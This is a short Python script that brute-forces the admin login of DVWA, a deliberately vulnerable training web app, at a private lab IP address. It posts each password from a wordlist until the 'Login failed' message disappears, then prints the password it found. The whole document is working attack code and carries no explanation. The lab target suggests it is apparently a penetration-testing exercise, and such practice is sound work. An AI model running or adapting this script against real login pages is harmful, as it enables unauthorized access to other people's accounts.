#!/usr/bin/env python3

import requests  # https://docs.python-requests.org/en/master/


target_url = "http://192.168.122.131/dvwa/login.php"
data = {"username": "admin", "password": "", "Login": "submit"}

with open("passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content.decode():
            print("[+] Got a password: " + word)
            exit()

print("[-] Reached EOL in passwords.txt")
